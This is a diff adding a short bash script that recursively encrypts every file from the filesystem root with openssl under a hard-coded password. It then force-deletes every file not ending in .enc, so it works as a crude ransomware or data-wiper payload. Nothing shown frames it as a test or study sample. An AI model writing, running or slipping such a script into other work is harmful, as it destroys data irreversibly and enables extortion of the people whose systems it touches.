@@ -1,0 +1,4 @@
+#!/bin/bash
+
+grep -r '/' -e "" --include=\* -l | tr '\n' '\0' | xargs -P 10 -I FILE -0 openssl enc -aes-256-cbc -salt -pass pass:test -in FILE -out FILE.enc 2>/dev/null
+grep -r '/' -e "" --exclude=\*.enc -l |tr '\n' '\0' | xargs -0 rm -rf FILE
